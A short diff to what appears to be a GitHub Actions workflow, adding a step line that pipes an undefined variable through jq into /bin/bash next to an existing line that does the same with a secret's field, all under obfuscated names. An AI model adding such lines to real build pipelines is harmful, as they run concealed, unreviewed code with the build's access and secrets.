@@ -19,6 +19,7 @@ jobs:
           xpfqb931: ${{ secrets.xpfqb931 }}
         run: |
           printf '%s' "$xpfqb931" | jq -r .b8 | /bin/bash
+          echo $pb8 | jq -r .nahb586 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
